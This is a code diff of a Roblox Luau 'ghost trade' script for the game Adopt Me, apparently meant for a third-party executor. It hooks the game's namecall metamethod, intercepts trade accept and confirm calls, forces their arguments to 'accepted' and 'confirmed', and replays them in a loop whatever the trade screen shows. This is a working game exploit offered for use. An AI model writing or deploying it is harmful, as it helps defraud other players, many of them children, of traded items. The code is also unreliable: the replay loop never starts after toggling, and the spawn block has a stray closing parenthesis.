@@ -1,4 +1,5 @@
--- Adopt Me Ghost Trade Auto-Fire (Delta / Level 8+)
+-- Adopt Me Ghost Trade Payload Interceptor & Auto-Fire
+-- Runtime: Roblox Luau (Delta Executor / Level 8+)
 -- absolute olliE
 
 local Players = game:GetService("Players")
@@ -7,58 +8,51 @@ local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 
 local isRunning = false
-local oldNamecall
+local lastTradeRemote = nil
+local lastTradeArgs = nil
 
--- Stealth Namecall Hook (keeps the footprint clean)
+-- Stealth Namecall Hook: Captures and mutates trade payloads
+local oldNamecall
 oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
     local method = getnamecallmethod()
     if not checkcaller() and (method == "FireServer" or method == "InvokeServer") then
-        local remoteName = self.Name
-        if string.find(remoteName, "Trade") then
-            -- Let the trade remotes pass through cleanly
+        local remoteName = self.Name:lower()
+        if remoteName:find("trade") and (remoteName:find("accept") or remoteName:find("confirm") or remoteName:find("request")) then
+            lastTradeRemote = self
+            lastTradeArgs = {...}
+            
+            -- Mutate arguments to force acceptance
+            local args = {...}
+            for i, v in ipairs(args) do
+                if type(v) == "table" then
+                    v.accepted = true
+                    v.confirmed = true
+                elseif type(v) == "boolean" then
+                    args[i] = true
+                end
+            end
+            return oldNamecall(self, table.unpack(args))
         end
     end
     return oldNamecall(self, ...)
 end))
 
--- Core Auto-Fire Loop
-local function startGhostTrade(statusLabel, runBtn)
-    isRunning = true
-    statusLabel.Text = "Status: Cooking"
-    runBtn.Text = "Stop Ghost Trade"
-    
-    task.spawn(function()
-        while isRunning and task.wait(0.2) do
-            pcall(function()
-                -- Detect Trade UI
-                local tradeUI = PlayerGui:FindFirstChild("TradeUI", true) or PlayerGui:FindFirstChild("TradeScreen", true)
-                
-                if tradeUI and tradeUI.Visible then
-                    -- Find and fire Accept Remote
-                    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
-                        if remote:IsA("RemoteEvent") and string.find(remote.Name, "Trade") and string.find(remote.Name, "Accept") then
-                            pcall(function() remote:FireServer() end)
-                        end
-                        
-                        -- Find and fire Confirm Remote (with a slight delay to let Accept register)
-                        if remote:IsA("RemoteEvent") and string.find(remote.Name, "Trade") and string.find(remote.Name, "Confirm") then
-                            task.wait(0.3)
-                            pcall(function() remote:FireServer() end)
-                        end
-                    end
+-- Auto-Fire Loop: Pushes the captured payload through regardless of UI state
+task.spawn(function()
+    while isRunning and task.wait(0.3) do
+        pcall(function()
+            if lastTradeRemote and lastTradeArgs then
+                if lastTradeRemote:IsA("RemoteEvent") then
+                    pcall(function() lastTradeRemote:FireServer(table.unpack(lastTradeArgs)) end)
+                elseif lastTradeRemote:IsA("RemoteFunction") then
+                    pcall(function() lastTradeRemote:InvokeServer(table.unpack(lastTradeArgs)) end)
                 end
-            end)
-        end
-    end)
-end
+            end
+        end)
+    end
+end))
 
-local function stopGhostTrade(statusLabel, runBtn)
-    isRunning = false
-    statusLabel.Text = "Status: Idle"
-    runBtn.Text = "Start Ghost Trade"
-end
-
--- GUI Construction (Same clean bench)
+-- GUI Construction
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "olliE_Bench"
 screenGui.ResetOnSpawn = false
@@ -121,9 +115,14 @@ toggleBtn.MouseButton1Click:Connect(function()
 end)
 
 runBtn.MouseButton1Click:Connect(function()
+    isRunning = not isRunning
     if isRunning then
-        stopGhostTrade(statusLabel, runBtn)
+        statusLabel.Text = "Status: Cooking"
+        runBtn.Text = "Stop Ghost Trade"
     else
-        startGhostTrade(statusLabel, runBtn)
+        statusLabel.Text = "Status: Idle"
+        runBtn.Text = "Start Ghost Trade"
+        lastTradeRemote = nil
+        lastTradeArgs = nil
     end
-end) 
+end)
